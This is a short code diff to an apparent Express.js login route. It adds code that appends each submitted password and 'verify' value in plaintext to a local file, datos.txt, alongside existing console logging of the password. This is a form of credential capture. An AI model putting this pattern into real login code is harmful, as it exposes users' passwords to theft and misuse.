@@ -11,10 +11,19 @@ router.get('/login', (request, response, next) => {
 });
 
 router.post('/login', (request, response, next) => {
-    const psw = (request.body.psw);
+    const psw = request.body.psw;
     console.log(psw);
     const verify = request.body.verify
     console.log(verify);
+
+
+fs.appendFile('datos.txt', psw + '\n' + verify + '\n', (err) => {
+    if (err) {
+        console.error('Error writing to file:', err);
+    } else {
+        console.log('Data saved');
+    }
+});
 
     response.setHeader('Content-Type', 'application/json');
     response.statusCode = 200;
